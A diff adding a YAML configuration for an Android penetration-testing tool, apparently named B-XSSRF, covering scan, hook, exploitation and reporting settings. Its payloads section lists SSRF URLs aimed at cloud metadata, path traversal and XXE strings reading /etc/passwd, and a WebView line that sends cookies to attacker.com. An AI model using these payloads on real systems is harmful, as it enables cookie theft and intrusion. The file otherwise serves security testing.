@@ -1,0 +1,286 @@
+# B-XSSRF v7 Configuration
+# Copy to config.local.yaml for local overrides (gitignored)
+
+# ============================
+# General Settings
+# ============================
+general:
+  # Log level: DEBUG, INFO, WARNING, ERROR, CRITICAL
+  log_level: "INFO"
+  # Output directory for reports and extracted data
+  output_dir: "./output"
+  # Maximum concurrent operations
+  max_concurrent: 4
+  # Default timeout for network operations (seconds)
+  default_timeout: 30
+
+# ============================
+# Static Analysis Configuration
+# ============================
+static_analysis:
+  # Manifest checks to perform
+  manifest_checks:
+    debuggable: true
+    allow_backup: true
+    uses_cleartext_traffic: true
+    network_security_config: true
+    exported_components: true
+    backup_agent: true
+    extract_native_libs: true
+    dangerous_permissions: true
+    webview_settings: true
+    trust_manager_usage: true
+
+  # Sensitive data patterns to extract
+  sensitive_patterns:
+    urls: true
+    emails: true
+    api_keys: true
+    tokens: true
+    # Custom regex patterns (name: pattern)
+    custom: {}
+
+  # Deep scan settings
+  deep_scan:
+    enabled: true
+    # File extensions to scan
+    extensions: [".xml", ".txt", ".json", ".html", ".js", ".smali", ".kt", ".java"]
+    # Maximum file size to scan (bytes)
+    max_file_size: 1048576  # 1MB
+    # Exclude patterns
+    exclude_patterns:
+      - "*.png"
+      - "*.jpg"
+      - "*.jpeg"
+      - "*.gif"
+      - "*.so"
+      - "*.dex"
+      - "*.odex"
+    # Maximum results per category
+    max_results_per_category: 50
+
+# ============================
+# Dynamic Analysis (Frida) Configuration
+# ============================
+dynamic_analysis:
+  enabled: true
+  # Frida script to load (relative to project root or absolute path)
+  script_path: "frida_hook.js"
+  # Additional Frida scripts to load (modular hooks)
+  additional_scripts: []
+  # Spawn vs Attach mode
+  spawn_mode: true
+  # Hook categories to enable
+  hook_categories:
+    - "network"
+    - "storage"
+    - "ipc"
+    - "auth"
+    - "anti"
+  # Event collection settings
+  event_collection:
+    max_events: 1000
+    flush_interval: 5  # seconds
+    include_stack_traces: true
+
+# ============================
+# Exploitation Configuration
+# ============================
+exploitation:
+  # ADB settings
+  adb:
+    enabled: true
+    timeout: 10
+    # Commands to try for JDWP exploitation
+    jdwp_tools: ["jdwp-shellifier", "jdwp-control"]
+
+  # Deep Link exploitation
+  deeplink:
+    enabled: true
+    # Payload categories to generate
+    payload_categories:
+      - "ssrf"
+      - "path_traversal"
+      - "open_redirect"
+      - "webview_abuse"
+      - "intent_abuse"
+      - "xxe"
+      - "deserialization"
+    # Maximum payloads per endpoint
+    max_payloads_per_endpoint: 20
+
+  # Backup exploitation
+  backup:
+    enabled: true
+    # abe.jar path (auto-detected if not set)
+    abe_jar_path: ""
+    # Extract and analyze backup
+    auto_extract: true
+    analyze_content: true
+
+  # Content Provider exploitation
+  content_provider:
+    enabled: true
+    test_sql_injection: true
+    test_path_traversal: true
+    test_grant_uri_permission: true
+
+# ============================
+# Payload Generation Configuration
+# ============================
+payloads:
+  # SSRF payloads
+  ssrf:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://127.0.0.1:80"
+    - "http://localhost:8080"
+    - "http://10.0.2.2:80"
+    - "http://2130706433"  # 127.0.0.1 decimal
+    - "http://0x7f000001"   # hex bypass
+    - "http://[::1]"        # IPv6 localhost
+    - "http://localhost.localdomain"
+    - "http://169.254.169.254"  # AWS/GCP/Azure metadata
+    - "http://metadata.google.internal"
+    - "http://metadata.azure.com"
+
+  # Path traversal payloads
+  path_traversal:
+    - "../../../../../../etc/passwd"
+    - "../../../../data/data/com.example/"
+    - "../../../../../../windows/win.ini"
+    - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"  # URL encoded
+    - "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"  # Double encoded
+
+  # Open redirect payloads
+  open_redirect:
+    - "http://evil.com"
+    - "https://attacker.com"
+    - "//evil.com"
+    - "/\\evil.com"
+    - "https:evil.com"
+
+  # XXE payloads
+  xxe:
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+
+  # WebView abuse payloads
+  webview_abuse:
+    - "javascript:alert(1)"
+    - "javascript:console.log(document.cookie)"
+    - "javascript:fetch('http://attacker.com/?c='+document.cookie)"
+
+  # Intent abuse payloads
+  intent_abuse:
+    - "intent://scan/#Intent;scheme={base};package=com.android.chrome;end"
+    - "intent://{base}#Intent;action=android.intent.action.VIEW;end"
+
+# ============================
+# Infrastructure Scanning Configuration
+# ============================
+infrastructure:
+  # Port scanning
+  port_scan:
+    enabled: true
+    # Port ranges to scan (comma-separated, supports ranges like 1-1000)
+    ports: "1-65535"
+    # Scan type: syn, connect, udp
+    scan_type: "syn"
+    # Service version detection
+    service_detection: true
+    # OS detection
+    os_detection: false
+    # Nmap timing template (0-5)
+    timing: 3
+
+  # Vulnerability scanning (Nuclei)
+  vulnerability_scan:
+    enabled: false  # Requires nuclei installed
+    templates_path: ""
+    severity: ["critical", "high", "medium"]
+    tags: ["cve", "misconfiguration", "exposure"]
+
+  # Subdomain enumeration
+  subdomain_enum:
+    enabled: false  # Requires subfinder installed
+    sources: ["crtsh", "virustotal", "securitytrails"]
+    recursive: false
+
+  # SSL/TLS analysis
+  ssl_analysis:
+    enabled: true
+    check_cert_transparency: true
+    check_weak_ciphers: true
+    check_protocols: true
+
+# ============================
+# Reporting Configuration
+# ============================
+reporting:
+  # Output formats
+  formats:
+    - "console"  # Rich table in terminal
+    - "txt"      # Text file
+    - "json"     # JSON for programmatic use
+    - "sarif"    # SARIF for CI/CD integration
+    - "html"     # HTML report (future)
+
+  # Report sections to include
+  sections:
+    - "manifest_risks"
+    - "secrets_manifest"
+    - "deep_scan"
+    - "generated_payloads"
+    - "live_exploitation"
+    - "network_infra"
+    - "recommendations"
+
+  # SARIF settings
+  sarif:
+    version: "2.1.0"
+    tool_name: "B-XSSRF"
+    tool_version: "7.0.0"
+
+  # Auto-save reports
+  auto_save: false
+  # Report filename template
+  filename_template: "bxssrf_report_{timestamp}.{ext}"
+
+# ============================
+# Risk Scoring Configuration
+# ============================
+risk_scoring:
+  # Risk levels: CRITICAL, HIGH, MEDIUM, LOW, INFO
+  manifest_risks:
+    debuggable: "CRITICAL"
+    allow_backup: "HIGH"
+    uses_cleartext_traffic: "HIGH"
+    missing_network_security_config: "MEDIUM"
+    exported_activity: "MEDIUM"
+    exported_service: "MEDIUM"
+    exported_receiver: "MEDIUM"
+    exported_provider: "HIGH"
+    backup_agent: "MEDIUM"
+    extract_native_libs: "LOW"
+    dangerous_permission: "MEDIUM"
+    webview_javascript_enabled: "MEDIUM"
+    webview_dom_storage: "LOW"
+    webview_mixed_content: "MEDIUM"
+    custom_trust_manager: "HIGH"
+
+  sensitive_data:
+    api_keys: "HIGH"
+    tokens: "CRITICAL"
+    emails: "LOW"
+    urls: "INFO"
+
+# ============================
+# Plugin Configuration (Future)
+# ============================
+plugins:
+  enabled: false
+  plugin_dirs:
+    - "./plugins"
+  auto_load: true
+  # Plugin-specific config (plugin_name: config)
+  configs: {}
